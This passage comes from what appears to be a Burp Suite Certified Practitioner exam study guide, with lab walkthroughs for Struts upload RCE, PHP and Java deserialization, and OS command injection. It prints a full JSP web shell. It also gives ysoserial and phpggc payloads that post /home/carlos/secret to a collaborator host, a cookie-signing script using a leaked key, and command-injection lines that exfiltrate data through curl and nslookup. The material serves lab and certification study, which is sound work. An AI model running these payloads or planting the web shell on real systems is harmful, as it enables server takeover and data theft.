                disr = dis.readLine(); 
                }
        }
%&gt;
&lt;/pre&gt;
&lt;/BODY&gt;&lt;/HTML&gt;"><pre>&lt;%@ <span class="pl-k">page</span> <span class="pl-e">import</span>=<span class="pl-s"><span class="pl-pds">"</span>java.util.*,java.io.*<span class="pl-pds">"</span></span>%&gt;
<span class="pl-pse">&lt;%</span><span class="pl-s1"></span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">//</span></span></span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">//</span> JSP_KIT</span></span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">//</span></span></span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">//</span> cmd.jsp = Command Execution (unix)</span></span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">//</span></span></span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">//</span> by: Unknown</span></span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">//</span> modified: 27/06/2003</span></span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">//</span></span></span>
<span class="pl-s1"></span><span class="pl-pse"><span class="pl-s1">%</span>&gt;</span>
&lt;<span class="pl-ent">HTML</span>&gt;&lt;<span class="pl-ent">BODY</span>&gt;
&lt;<span class="pl-ent">FORM</span> <span class="pl-e">METHOD</span>=<span class="pl-s"><span class="pl-pds">"</span>GET<span class="pl-pds">"</span></span> <span class="pl-e">NAME</span>=<span class="pl-s"><span class="pl-pds">"</span>myform<span class="pl-pds">"</span></span> <span class="pl-e">ACTION</span>=<span class="pl-s"><span class="pl-pds">"</span><span class="pl-pds">"</span></span>&gt;
&lt;<span class="pl-ent">INPUT</span> <span class="pl-e">TYPE</span>=<span class="pl-s"><span class="pl-pds">"</span>text<span class="pl-pds">"</span></span> <span class="pl-e">NAME</span>=<span class="pl-s"><span class="pl-pds">"</span>cmd<span class="pl-pds">"</span></span>&gt;
&lt;<span class="pl-ent">INPUT</span> <span class="pl-e">TYPE</span>=<span class="pl-s"><span class="pl-pds">"</span>submit<span class="pl-pds">"</span></span> <span class="pl-e">VALUE</span>=<span class="pl-s"><span class="pl-pds">"</span>Send<span class="pl-pds">"</span></span>&gt;
&lt;/<span class="pl-ent">FORM</span>&gt;
&lt;<span class="pl-ent">pre</span>&gt;
<span class="pl-pse">&lt;%</span><span class="pl-s1"></span>
<span class="pl-s1"><span class="pl-k">if</span> (request<span class="pl-k">.</span>getParameter(<span class="pl-s"><span class="pl-pds">"</span>cmd<span class="pl-pds">"</span></span>) <span class="pl-k">!=</span> <span class="pl-c1">null</span>) {</span>
<span class="pl-s1">        out<span class="pl-k">.</span>println(<span class="pl-s"><span class="pl-pds">"</span>Command: <span class="pl-pds">"</span></span> <span class="pl-k">+</span> request<span class="pl-k">.</span>getParameter(<span class="pl-s"><span class="pl-pds">"</span>cmd<span class="pl-pds">"</span></span>) <span class="pl-k">+</span> <span class="pl-s"><span class="pl-pds">"</span>&lt;BR&gt;<span class="pl-pds">"</span></span>);</span>
<span class="pl-s1">        <span class="pl-smi">Process</span> p <span class="pl-k">=</span> <span class="pl-smi">Runtime</span><span class="pl-k">.</span>getRuntime()<span class="pl-k">.</span>exec(request<span class="pl-k">.</span>getParameter(<span class="pl-s"><span class="pl-pds">"</span>cmd<span class="pl-pds">"</span></span>));</span>
<span class="pl-s1">        <span class="pl-smi">OutputStream</span> os <span class="pl-k">=</span> p<span class="pl-k">.</span>getOutputStream();</span>
<span class="pl-s1">        <span class="pl-smi">InputStream</span> in <span class="pl-k">=</span> p<span class="pl-k">.</span>getInputStream();</span>
<span class="pl-s1">        <span class="pl-smi">DataInputStream</span> dis <span class="pl-k">=</span> <span class="pl-k">new</span> <span class="pl-smi">DataInputStream</span>(in);</span>
<span class="pl-s1">        <span class="pl-smi">String</span> disr <span class="pl-k">=</span> dis<span class="pl-k">.</span>readLine();</span>
<span class="pl-s1">        <span class="pl-k">while</span> ( disr <span class="pl-k">!=</span> <span class="pl-c1">null</span> ) {</span>
<span class="pl-s1">                out<span class="pl-k">.</span>println(disr); </span>
<span class="pl-s1">                disr <span class="pl-k">=</span> dis<span class="pl-k">.</span>readLine(); </span>
<span class="pl-s1">                }</span>
<span class="pl-s1">        }</span>
<span class="pl-s1"></span><span class="pl-pse"><span class="pl-s1">%</span>&gt;</span>
&lt;/<span class="pl-ent">pre</span>&gt;
&lt;/<span class="pl-ent">BODY</span>&gt;&lt;/<span class="pl-ent">HTML</span>&gt;</pre></div>
<blockquote>
<p dir="auto">target only accepts a single valid image file since it performs MIME checks:</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/CVE-2024-53677-part1.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/CVE-2024-53677-part1.png" alt="CVE-2024-53677 part1" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">By OGNL injection, rewrite file to code shell.jsp and place in rout of web application.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/CVE-2024-53677-part2.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/CVE-2024-53677-part2.png" alt="CVE-2024-53677 part 2" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">RCE Execution achived <code>http://strutted.htb/webshell.jsp?cmd=id</code></p>
</blockquote>
<hr>
<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">Deserialization</h2><a id="user-content-deserialization" class="anchor" aria-label="Permalink: Deserialization" href="#deserialization"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto"><a href="#customtemplate-php">CustomTemplate PHP</a><br>
<a href="#burp-deserialization-scanner">Burp Deserialization Scanner</a><br>
<a href="#ysoserial">YsoSerial</a><br>
<a href="#sha1-hmac-symfony">SHA1 HMAC Symfony</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">CustomTemplate PHP</h3><a id="user-content-customtemplate-php" class="anchor" aria-label="Permalink: CustomTemplate PHP" href="#customtemplate-php"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Reading page <code>source code</code> and noticing comment mentioning <strong></strong>, this <em><strong>identify</strong></em> possible PHP framework and the Burp scanner <em><strong>identify</strong></em> serialized session cookie object after we logged in with stolen <code>wiener:peter</code> credentials.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/info-disclose.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/info-disclose.png" alt="info-disclose" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Reviewing PHP <code>source code</code> by adding tilde <em><strong>~</strong></em> character at end of GET request <code>https://target.net/libs/CustomTemplate.php~</code>, we notice the <strong>destruct</strong> method.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/comments-in-source-code.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/comments-in-source-code.png" alt="comments-in-source-code" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Original Decoded cookie</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="O:4:&quot;User&quot;:2:{s:8:&quot;username&quot;;s:6:&quot;wiener&quot;;s:12:&quot;access_token&quot;;s:32:&quot;bi0egmdu49lnl9h2gxoj3at4sh3ifh9x&quot;;}"><pre class="notranslate"><code>O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"bi0egmdu49lnl9h2gxoj3at4sh3ifh9x";}
</code></pre></div>
<blockquote>
<p dir="auto">Make new PHP serial CustomTemplate object with the <strong>lock_file_path</strong> attribute set to <strong>/home/carlos/morale.txt</strong>. Make sure to use the correct data type labels and length indicators. The 's' indicate string and the length.</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="O:14:&quot;CustomTemplate&quot;:1:{s:14:&quot;lock_file_path&quot;;s:23:&quot;/home/carlos/morale.txt&quot;;}"><pre class="notranslate"><code>O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
</code></pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/modify-serial-cookie.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/modify-serial-cookie.png" alt="modify-serial-cookie" style="max-width: 100%;"></a></p>
<p dir="auto"><a href="https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php" rel="nofollow">PortSwigger Lab: Arbitrary object injection in PHP</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Burp Deserialization Scanner</h3><a id="user-content-burp-deserialization-scanner" class="anchor" aria-label="Permalink: Burp Deserialization Scanner" href="#burp-deserialization-scanner"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Intercept the admin panel page in the Burp Practice Exam, and <em><strong>identify</strong></em> the serial value of the cookie named <code>admin-prefs</code>. This challenge is from the <a href="https://portswigger.net/web-security/certification/takepracticeexam/index.html" rel="nofollow">PortSwigger Practice Exam APP</a>.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/admin-prefs-serial-cookie.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/admin-prefs-serial-cookie.png" alt="Admin prefs serial cookie" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Use below payload in the Deserialization scanner exploiting Java jar ysoserial command, to obtain remote code execution (RCE) when payload de-serialized on target.</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="CommonsCollections3 'wget http://OASTIFY.COM --post-file=/home/carlos/secret'"><pre class="notranslate"><code>CommonsCollections3 'wget http://OASTIFY.COM --post-file=/home/carlos/secret'
</code></pre></div>
<blockquote>
<p dir="auto">Image below is from the Practice exam, I have some issues with my setup as the old version of java is needed when running <code>ysoserial</code> in bash terminal, and the Burp Suite Pro app need <code>sudo</code> to save the config of the extension.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/ysoserial-rce.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/ysoserial-rce.png" alt="ysoserial rce" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Burp Deserialization Scanner configuration when running burp as sudo, leaving the java path to <code>java</code> and the ysoserial path to ``. My scanner detect the java deserialization in the burp issue list but not when i run it manual???</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/Deserialization-scanner-config.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/Deserialization-scanner-config.png" alt="Deserialization scanner config setup" style="max-width: 100%;"></a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">YsoSerial</h3><a id="user-content-ysoserial" class="anchor" aria-label="Permalink: YsoSerial" href="#ysoserial"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Below is ysoserial command line execution to generate base64 encoded serialized cookie object containing payload.</p>
</blockquote>
<blockquote>
<p dir="auto"><strong>IMPORTANT:</strong> If you get error message when executing <code>java -jar ysoserial &lt;Payload&gt;</code> saying something in lines of <em><strong>java.lang.IllegalAccessError: class ysoserial.payloads.util.Gadgets</strong></em>, the switch to alternative Java on Linux with following commands.</p>
</blockquote>
<div class="highlight highlight-source-shell notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="java --version
update-java-alternatives --list
sudo update-java-alternatives --set /usr/lib/jvm/java-1.11.0-openjdk-amd64
java --version"><pre>java --version
update-java-alternatives --list
sudo update-java-alternatives --set /usr/lib/jvm/java-1.11.0-openjdk-amd64
java --version</pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/switch-java-version.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/switch-java-version.png" alt="Switch Java version" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Now execute <code>ysoserial</code> to generate base64 payload, using Java version 11. Replace session cookie with generated base64 payload and URL encode only the key characters before sending request.</p>
</blockquote>
<div class="highlight highlight-source-shell notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="java -jar /opt/ysoserial/ysoserial.jar CommonsCollections4 'wget http://OASTIFY.COM --post-file=/home/carlos/secret' | base64 -w 0"><pre>java -jar /opt/ysoserial/ysoserial.jar CommonsCollections4 <span class="pl-s"><span class="pl-pds">'</span>wget http://OASTIFY.COM --post-file=/home/carlos/secret<span class="pl-pds">'</span></span> <span class="pl-k">|</span> base64 -w 0</pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/ysoserial-command.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/ysoserial-command.png" alt="ysoserial Command" style="max-width: 100%;"></a></p>
<p dir="auto"><a href="https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-java-deserialization-with-apache-commons" rel="nofollow">PortSwigger Lab: Exploiting Java deserialization with Apache Commons</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">SHA1 HMAC Symfony</h3><a id="user-content-sha1-hmac-symfony" class="anchor" aria-label="Permalink: SHA1 HMAC Symfony" href="#sha1-hmac-symfony"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto"><em><strong>Identify</strong></em> that the cookie contains a Base64-encoded token, signed with a SHA-1 HMAC hash. On the home page we discover a developer comment to debug info for <code>/cgi-bin/phpinfo.php</code>, revealing the digital signature to sign new token. Sending invalid cookie session value the error reveals, <code>Symfony Version: 4.3.6</code>.</p>
</blockquote>
<blockquote>
<p dir="auto"><strong>Note:</strong> In BSCP exam not going to run this as it delete the file, but in exam read <code>source code</code> to <em><strong>identify</strong></em> the <code>unserialize()</code> PHP function and extract content out-of-band using <code>PHPGGC</code>.</p>
</blockquote>
<blockquote>
<p dir="auto">Exploit steps to perform a PHP deserialization with a pre-built gadget chain.</p>
</blockquote>
<ol dir="auto">
<li>Request the <code>/cgi-bin/phpinfo.php</code> file to find the leaked <code>SECRET_KEY</code> information about the website.</li>
<li>Generate a Base64-encoded serialized object that exploits an RCE gadget chain in Symfony <code>phpggc Symfony/RCE4 exec 'wget http://OASTIFY.COM --post-file=/home/carlos/secret' | base64 -w 0</code>.</li>
<li>Construct a valid cookie containing this malicious object and sign it correctly using the secret key you obtained.</li>
</ol>
<div class="highlight highlight-text-html-php notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&lt;?php
$object = &quot;OBJECT-GENERATED-BY-PHPGGC&quot;;
$secretKey = &quot;LEAKED-SECRET-KEY-FROM-PHPINFO.PHP&quot;;
$cookie = urlencode('{&quot;token&quot;:&quot;' . $object . '&quot;,&quot;sig_hmac_sha1&quot;:&quot;' . hash_hmac('sha1', $object, $secretKey) . '&quot;}');
echo $cookie;"><pre><span class="pl-ent">&lt;?php</span>
<span class="pl-s1"><span class="pl-c1">$</span>object</span> = <span class="pl-s">"<span class="pl-s">OBJECT-GENERATED-BY-PHPGGC</span>"</span>;
<span class="pl-s1"><span class="pl-c1">$</span>secretKey</span> = <span class="pl-s">"<span class="pl-s">LEAKED-SECRET-KEY-FROM-PHPINFO.PHP</span>"</span>;
<span class="pl-s1"><span class="pl-c1">$</span>cookie</span> = <span class="pl-en">urlencode</span>(<span class="pl-s">'<span class="pl-s">{"token":"</span>'</span> . <span class="pl-s1"><span class="pl-c1">$</span>object</span> . <span class="pl-s">'<span class="pl-s">","sig_hmac_sha1":"</span>'</span> . <span class="pl-en">hash_hmac</span>(<span class="pl-s">'<span class="pl-s">sha1</span>'</span>, <span class="pl-s1"><span class="pl-c1">$</span>object</span>, <span class="pl-s1"><span class="pl-c1">$</span>secretKey</span>) . <span class="pl-s">'<span class="pl-s">"}</span>'</span>);
<span class="pl-k">echo</span> <span class="pl-s1"><span class="pl-c1">$</span>cookie</span>;</pre></div>
<ol start="4" dir="auto">
<li>Execute the php code in terminal, <code>php Symfony_insecure_deserial_php.php</code> to obtain signed cookie.</li>
</ol>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/symphony-phpgcc.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/symphony-phpgcc.png" alt="Symfony phpggc gadget deserial" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Replace cookie value and send request to get remote code execution (RCE) when cookie is deserialised server side. Ignore the server response <code>HTTP/2 500 Internal Server Error</code>, check the collaborator if data was received.</p>
</blockquote>
<p dir="auto"><a href="https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain" rel="nofollow">PortSwigger Lab: Exploiting PHP deserialization with a pre-built gadget chain</a></p>
<hr>
<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">OS Command Injection</h2><a id="user-content-os-command-injection" class="anchor" aria-label="Permalink: OS Command Injection" href="#os-command-injection"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<ul dir="auto">
<li><a href="#feedback">Feedback</a></li>
<li><a href="#output-redirection">Output redirection</a></li>
</ul>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Feedback</h3><a id="user-content-feedback" class="anchor" aria-label="Permalink: Feedback" href="#feedback"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Use following command separation characters to <em><strong>identify</strong></em> Operating System Command injection vulnerabilities.</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content=" &amp;&amp;
 &amp;
 ||
 |
 ;
 `
 '
 &quot;
 0x0a
 \n"><pre class="notranslate"><code> &amp;&amp;
 &amp;
 ||
 |
 ;
 `
 '
 "
 0x0a
 \n
</code></pre></div>
<blockquote>
<p dir="auto">The target application <strong>submit feedback</strong> function require email value, and <em><strong>identifying</strong></em> blind OS command injection by appending <code>||curl OASTIFY.COM||</code> bash command, we then can observe a request made to Collaborator.</p>
</blockquote>
<div class="highlight highlight-source-shell notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="email=carlos@exam.net||curl+`whoami`.OASTIFY.COM||"><pre>email=carlos@exam.net<span class="pl-k">||</span>curl+<span class="pl-s"><span class="pl-pds">`</span>whoami<span class="pl-pds">`</span></span>.OASTIFY.COM<span class="pl-k">||</span></pre></div>
<blockquote>
<p dir="auto">The below payload use DNS exfiltration and the Burp Collaborator DNS service.</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="||$(curl $(cat /home/carlos/secret).OASTIFY.COM)||"><pre class="notranslate"><code>||$(curl $(cat /home/carlos/secret).OASTIFY.COM)||
</code></pre></div>
<blockquote>
<p dir="auto">In this YouTube video <a href="https://youtu.be/o7oVWXw4t5E" rel="nofollow">Leet Cipher</a> show how to use DNS rebinding with blind command injection to exfiltration the contents of <code>passwd</code> from the target by first uploading bash script that Base64 and then Base58 encode the <code>passwd</code> file content, to strip special character not able to ex-filtrate with DNS label restrictions.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/os-command-inject.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/os-command-inject.png" alt="OS command injection" style="max-width: 100%;"></a></p>
<p dir="auto"><a href="https://github.com/leetCipher/bug-bounty-labs/tree/main/dns-exfiltration-lab/poc">leetCipher Github scripts for Blind OS DNS exfiltrate</a></p>
<blockquote>
<p dir="auto">PortSwigger Lab payload perform a DNS lookup using <code>nslookup</code> as a Burp Collaborator subdomain.</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="email=peanut2019@nuts.net||nslookup+`whoami`.OASTIFY.COM||"><pre class="notranslate"><code>email=peanut2019@nuts.net||nslookup+`whoami`.OASTIFY.COM||
</code></pre></div>
<p dir="auto"><a href="https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration" rel="nofollow">PortSwigger Lab: Blind OS command injection with out-of-band data exfiltration</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Output redirection</h3><a id="user-content-output-redirection" class="anchor" aria-label="Permalink: Output redirection" href="#output-redirection"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">If OS command injection <em><strong>identified</strong></em>, and filter in place preventing complex command injection, attempt to redirect output to writable folder. <em><strong>Identify</strong></em> a <a href="#file-path-traversal">path traversal</a> vulnerability that allow reading of files only in current WEB APP.</p>
</blockquote>
<blockquote>
<p dir="auto"><em><strong>Identify</strong></em> the working directory using <code>pwd</code> command output redirected, and appending to <code>output.txt</code> file every bash command stdout.</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="||pwd&gt;output.txt||
||echo&gt;&gt;output.txt||
||cat+/etc/hosts&gt;&gt;/var/www/images/output.txt||
||echo&gt;&gt;output.txt||
||ls+-al&gt;&gt;/var/www/images/output.txt||
||echo&gt;&gt;output.txt||
||whoami&gt;&gt;/var/www/images/output.txt||"><pre class="notranslate"><code>||pwd&gt;output.txt||
||echo&gt;&gt;output.txt||
||cat+/etc/hosts&gt;&gt;/var/www/images/output.txt||
||echo&gt;&gt;output.txt||
